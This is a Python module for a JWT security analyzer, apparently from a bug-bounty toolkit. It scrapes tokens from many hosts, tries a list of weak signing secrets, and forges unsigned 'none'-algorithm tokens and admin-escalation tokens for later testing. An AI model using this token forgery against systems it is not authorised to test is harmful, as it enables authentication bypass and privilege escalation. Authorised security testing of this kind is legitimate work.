"""
JWT (JSON Web Token) Analyzer

Analyzes and tests JWT security:
- Decode and inspect JWT structure
- Test for 'none' algorithm vulnerability
- Test for algorithm confusion (RS256 -> HS256)
- Weak secret detection
- Expired token acceptance
- Missing signature validation

WHY JWT ANALYSIS?
JWTs are everywhere for authentication. Common vulnerabilities:
- Algorithm confusion: Change RS256 to HS256, sign with public key
- None algorithm: Remove signature entirely
- Weak secrets: Brute-force common passwords
- No expiration check: Use expired tokens forever

These are HIGH severity auth bypasses - $5k-$20k bounties.
"""
import asyncio
import aiohttp
import base64
import json
import hmac
import hashlib
import re
from pathlib import Path
from datetime import datetime
from src.utils import learn, success, error, info, warning, timestamp


class JWTAnalyzer:
    def __init__(self, config: dict, learn_mode: bool = False):
        self.config = config
        self.learn_mode = learn_mode
        self.timeout = aiohttp.ClientTimeout(total=10)
        
        # Common weak secrets to test
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'key', 'private',
            'jwt_secret', 'jwt-secret', 'jwtSecret', 'secretkey', 'secret_key',
            'your-256-bit-secret', 'your-secret-key', 'changeme', 'changeit',
            'test', 'development', 'dev', 'prod', 'production',
            'supersecret', 'super_secret', 'mysecret', 'my_secret',
            '', ' ', 'null', 'undefined', 'none',
        ]
        
        # JWT regex pattern
        self.jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
        )
    
    def decode_jwt(self, token: str) -> dict | None:
        """Decode JWT without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            
            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'raw': token
            }
        except Exception:
            return None
    
    def analyze_jwt(self, decoded: dict) -> dict:
        """Analyze decoded JWT for security issues."""
        issues = []
        header = decoded['header']
        payload = decoded['payload']
        
        # Check algorithm
        alg = header.get('alg', '').upper()
        if alg == 'NONE':
            issues.append({
                'type': 'none_algorithm',
                'severity': 'critical',
                'description': 'JWT uses "none" algorithm - signature not required!'
            })
        elif alg == 'HS256':
            issues.append({
                'type': 'symmetric_algorithm',
                'severity': 'info',
                'description': 'Uses HS256 - test for weak secrets and algorithm confusion'
            })
        
        # Check expiration
        exp = payload.get('exp')
        if not exp:
            issues.append({
                'type': 'no_expiration',
                'severity': 'medium',
                'description': 'JWT has no expiration claim'
            })
        elif exp < datetime.now().timestamp():
            issues.append({
                'type': 'expired_token',
                'severity': 'high',
                'description': f'JWT is expired (exp: {datetime.fromtimestamp(exp)})'
            })
        
        # Check for sensitive data in payload
        sensitive_keys = ['password', 'secret', 'key', 'token', 'credit_card', 'ssn']
        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                issues.append({
                    'type': 'sensitive_data',
                    'severity': 'medium',
                    'description': f'Potentially sensitive data in payload: {key}'
                })
        
        # Check for admin/role claims
        if payload.get('admin') or payload.get('role') == 'admin':
            issues.append({
                'type': 'admin_claim',
                'severity': 'info',
                'description': 'JWT contains admin privileges - test for privilege escalation'
            })
        
        return {
            'decoded': decoded,
            'algorithm': alg,
            'issues': issues,
            'has_critical': any(i['severity'] == 'critical' for i in issues)
        }
    
    def create_none_token(self, decoded: dict) -> str:
        """Create a token with 'none' algorithm (no signature)."""
        header = {'alg': 'none', 'typ': 'JWT'}
        payload = decoded['payload']
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def create_hs256_token(self, decoded: dict, secret: str) -> str:
        """Create HS256 signed token with given secret."""
        header = {'alg': 'HS256', 'typ': 'JWT'}
        payload = decoded['payload']
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{message}.{sig_b64}"
    
    def create_modified_token(self, decoded: dict, modifications: dict, secret: str = None) -> str:
        """Create token with modified payload."""
        new_payload = decoded['payload'].copy()
        new_payload.update(modifications)
        
        modified = {'header': decoded['header'], 'payload': new_payload}
        
        if secret:
            return self.create_hs256_token(modified, secret)
        return self.create_none_token(modified)
    
    async def test_token(self, session: aiohttp.ClientSession, url: str, 
                         token: str, original_response: str = None) -> dict | None:
        """Test if a modified token is accepted."""
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'User-Agent': 'Mozilla/5.0 (compatible; JWTAnalyzer/1.0)',
            }
            
            async with session.get(
                url, headers=headers, timeout=self.timeout, ssl=False
            ) as resp:
                content = await resp.text()
                
                # Check if token was accepted
                if resp.status in [200, 201, 204]:
                    return {
                        'accepted': True,
                        'status': resp.status,
                        'response_preview': content[:300]
                    }
                elif resp.status == 401 or resp.status == 403:
                    return {
                        'accepted': False,
                        'status': resp.status,
                        'response_preview': content[:300]
                    }
        except Exception:
            pass
        return None
    
    async def test_weak_secrets(self, decoded: dict, original_token: str) -> list:
        """Test for weak JWT secrets."""
        found_secrets = []
        
        for secret in self.weak_secrets:
            try:
                test_token = self.create_hs256_token(decoded, secret)
                # Compare signatures
                if test_token.split('.')[2] == original_token.split('.')[2]:
                    found_secrets.append({
                        'secret': secret,
                        'severity': 'critical',
                        'description': f'JWT signed with weak secret: "{secret}"'
                    })
            except Exception:
                pass
        
        return found_secrets
    
    async def extract_jwts_from_response(self, session: aiohttp.ClientSession, 
                                          url: str) -> list:
        """Extract JWTs from a response."""
        jwts = []
        try:
            async with session.get(url, timeout=self.timeout, ssl=False) as resp:
                content = await resp.text()
                
                # Find JWTs in response body
                matches = self.jwt_pattern.findall(content)
                jwts.extend(matches)
                
                # Check headers
                for header_name in ['Authorization', 'X-Auth-Token', 'X-JWT-Token']:
                    if header_name in resp.headers:
                        header_val = resp.headers[header_name]
                        if header_val.startswith('Bearer '):
                            header_val = header_val[7:]
                        if self.jwt_pattern.match(header_val):
                            jwts.append(header_val)
                
                # Check cookies
                for cookie in resp.cookies.values():
                    if self.jwt_pattern.match(cookie.value):
                        jwts.append(cookie.value)
        except Exception:
            pass
        
        return list(set(jwts))
    
    async def analyze_host(self, session: aiohttp.ClientSession, host: str) -> dict:
        """Analyze JWTs for a host."""
        result = {
            'host': host,
            'jwts_found': [],
            'vulnerabilities': [],
            'weak_secrets': [],
            'test_tokens': []
        }
        
        base_url = f"https://{host}" if not host.startswith('http') else host
        
        # Try to find JWTs
        jwts = await self.extract_jwts_from_response(session, base_url)
        
        # Also check common auth endpoints
        auth_endpoints = ['/api/auth', '/api/login', '/api/user', '/api/me', '/auth/token']
        for endpoint in auth_endpoints:
            try:
                url = f"{base_url}{endpoint}"
                more_jwts = await self.extract_jwts_from_response(session, url)
                jwts.extend(more_jwts)
            except Exception:
                pass
        
        jwts = list(set(jwts))
        
        for jwt in jwts:
            decoded = self.decode_jwt(jwt)
            if decoded:
                result['jwts_found'].append(decoded)
                
                # Analyze JWT
                analysis = self.analyze_jwt(decoded)
                result['vulnerabilities'].extend(analysis['issues'])
                
                # Test weak secrets
                weak = await self.test_weak_secrets(decoded, jwt)
                result['weak_secrets'].extend(weak)
                
                # Generate test tokens
                result['test_tokens'].append({
                    'original': jwt,
                    'none_alg': self.create_none_token(decoded),
                    'admin_escalation': self.create_modified_token(
                        decoded, {'admin': True, 'role': 'admin'}
                    )
                })
        
        return result
    
    async def analyze_async(self, hosts: list, output_dir: str) -> dict:
        """Analyze JWTs across multiple hosts."""
        learn("JWT Analysis",
              "JSON Web Tokens are used everywhere for authentication. Common vulnerabilities:\n\n"
              "• 'none' algorithm: Remove signature, server accepts unsigned token\n"
              "• Algorithm confusion: Change RS256→HS256, sign with public key\n"
              "• Weak secrets: Brute-force common passwords like 'secret', '123456'\n"
              "• No expiration: Tokens valid forever\n"
              "• Privilege escalation: Modify 'admin' or 'role' claims\n\n"
              "We extract JWTs from responses and test:\n"
              "1. Decode and analyze structure\n"
              "2. Test weak secrets\n"
              "3. Generate attack tokens (none alg, modified claims)\n\n"
              "Auth bypass via JWT = $5k-$20k bounties",
              self.learn_mode)
        
        info(f"Analyzing JWTs on {len(hosts)} hosts...")
        
        results = {
            'total_hosts': len(hosts),
            'hosts_with_jwts': 0,
            'total_jwts': 0,
            'critical_findings': [],
            'weak_secrets_found': [],
            'test_tokens': [],
            'by_host': {}
        }
        
        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(10)
            
            async def analyze_with_limit(host):
                async with semaphore:
                    return await self.analyze_host(session, host)
            
            tasks = [analyze_with_limit(host) for host in hosts]
            host_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for host_result in host_results:
                if isinstance(host_result, dict):
                    host = host_result['host']
                    results['by_host'][host] = host_result
                    
                    if host_result['jwts_found']:
                        results['hosts_with_jwts'] += 1
                        results['total_jwts'] += len(host_result['jwts_found'])
                    
                    # Collect critical findings
                    for vuln in host_result['vulnerabilities']:
                        if vuln['severity'] == 'critical':
                            vuln['host'] = host
                            results['critical_findings'].append(vuln)
                    
                    results['weak_secrets_found'].extend(host_result['weak_secrets'])
                    results['test_tokens'].extend(host_result['test_tokens'])
        
        # Report findings
        success(f"Found {results['total_jwts']} JWTs on {results['hosts_with_jwts']} hosts")
        
        if results['critical_findings']:
            warning(f"🚨 {len(results['critical_findings'])} CRITICAL JWT vulnerabilities!")
        
        if results['weak_secrets_found']:
            warning(f"⚠️ Found {len(results['weak_secrets_found'])} weak JWT secrets!")
        
        # Save results
        output_file = Path(output_dir) / f"jwt_analysis_{timestamp()}.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        # Save test tokens for manual testing
        if results['test_tokens']:
            tokens_file = Path(output_dir) / "jwt_test_tokens.txt"
            with open(tokens_file, 'w') as f:
                f.write("# JWT Test Tokens\n")
                f.write("# Use these to test for vulnerabilities manually\n\n")
                for tt in results['test_tokens']:
                    f.write(f"Original: {tt['original']}\n")
                    f.write(f"None Algorithm: {tt['none_alg']}\n")
                    f.write(f"Admin Escalation: {tt['admin_escalation']}\n")
                    f.write("-" * 50 + "\n")
        
        return results
    
    def analyze(self, hosts: list, output_dir: str) -> dict:
        """Synchronous wrapper."""
        return asyncio.run(self.analyze_async(hosts, output_dir))
